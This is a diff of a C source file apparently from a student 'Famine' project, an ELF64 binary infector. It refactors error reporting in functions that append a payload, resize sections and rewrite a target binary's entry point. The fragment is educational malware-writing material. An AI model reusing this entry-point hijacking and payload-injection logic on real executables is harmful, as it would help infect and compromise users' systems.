@@ -6,7 +6,7 @@
 /*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/03/11 15:42:04 by agrumbac          #+#    #+#             */
-/*   Updated: 2019/06/07 11:56:56 by agrumbac         ###   ########.fr       */
+/*   Updated: 2019/06/07 12:45:13 by agrumbac         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -20,10 +20,7 @@ static bool	change_entry(const struct safe_pointer info,
 {
 	Elf64_Ehdr	*clone_hdr = safe(0, sizeof(Elf64_Ehdr));
 
-#ifdef DEBUG
-	char	e[] = {'7','1','\0'};
-#endif
-	if (!clone_hdr)  return errors(ERR_CORRUPT, e);
+	if (!clone_hdr)  return errors(ERR_CORRUPT, 'a','1');
 
 	const Elf64_Xword	sh_offset         = endians.endian_8(original_entry->safe_shdr->sh_offset);
 	const size_t		offset_in_section = original_entry->offset_in_section;
@@ -45,10 +42,7 @@ static bool	adjust_sizes(const struct endians_pointer endians,
 	struct entry	clone_entry;
 	const size_t	payload_size = _start - famine_entry;
 
-#ifdef DEBUG
-	char e[] = {'7','2','\0'};
-#endif
-	if (!find_entry(&clone_entry, info, endians)) return errors(ERR_THROW, e);
+	if (!find_entry(&clone_entry, info, endians)) return errors(ERR_THROW, 'a','2');
 
 	size_t		sh_size  = endians.endian_8(clone_entry.safe_last_section_shdr->sh_size);
 	Elf64_Xword	p_filesz = endians.endian_8(clone_entry.safe_phdr->p_filesz);
@@ -87,11 +81,8 @@ static bool	define_shift_amount(const struct endians_pointer endians,
 
 	const size_t	end_padding = (p_memsz % p_align) + *shift_amount;
 
-#ifdef DEBUG
-	char	e[] = {'7','3','\0'};
-#endif
 	if (end_padding > p_align)
-		return errors(ERR_USAGE, e);
+		return errors(ERR_USAGE, 'a','3');
 
 	return true;
 }
@@ -101,9 +92,6 @@ bool		elf64_packer(const struct famine food, size_t original_file_size)
 	struct entry	original_entry;
 	size_t		shift_amount;
 
-#ifdef DEBUG
-	char e[] = {'7','4','\0'};
-#endif
 	if (!find_entry(&original_entry, food.original_safe, food.endians)
 	|| !define_shift_amount(food.endians, &original_entry, &shift_amount)
 	|| !copy_to_clone(food, original_entry.end_of_last_section, shift_amount, original_file_size)
@@ -111,7 +99,7 @@ bool		elf64_packer(const struct famine food, size_t original_file_size)
 	|| !adjust_sizes(food.endians, food.clone_safe, shift_amount)
 	|| !setup_payload(&original_entry, food.endians, food.clone_safe)
 	|| !change_entry(food.clone_safe, food.endians, &original_entry))
-		return errors(ERR_THROW, e);
+		return errors(ERR_THROW, 'a','4');
 
 	return true;
 }
